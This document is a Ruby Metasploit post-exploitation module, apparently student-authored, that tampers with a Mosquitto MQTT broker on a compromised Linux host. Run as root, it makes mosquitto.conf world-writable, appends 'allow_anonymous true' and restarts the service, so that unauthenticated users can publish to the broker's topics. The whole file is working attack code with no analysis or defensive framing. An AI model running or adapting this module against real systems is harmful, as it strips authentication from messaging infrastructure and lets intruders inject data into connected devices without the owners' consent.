##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Break Mosquitto .conf',
        'Description'   => %q{
          This module attempts to change Mosquitto conf file to allow
          unauthorized user to publish in the topics managed by the broker.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Luca Perracchio <20005279[at]studenti.uniupo.it'
          ],
        'Platform'      => %w{linux},
        'References'    =>
          [

          ],
        'SessionTypes'  => [ 'shell' ]
      ))

      register_options(
        [

        ])
  end

  # Run Method for when run command is issued
  def run
    unless is_root?
      fail_with Failure::NoAccess, 'You must run this module as root!'
    end
    #set path to mosquitto conf file
    conf_file_path = '/etc/mosquitto/'
    cmd_exec("cd #{conf_file_path}")
    if conf_file_path.eql?(pwd() + "/") == false
      print_error("MOSQUITTO not present")
      return
    end
    print_status("Changing file permission...")
    cmd_exec("sudo chmod 777 mosquitto.conf")
    print_status("Adding allow_anonymous...")
    cmd_exec("echo \'allow_anonymous true\' >> mosquitto.conf")
    print_status("Service restarting")
    cmd_exec("sudo service mosquitto stop")
    cmd_exec("sudo service mosquitto start")
    print_good("DONE")
  end
end
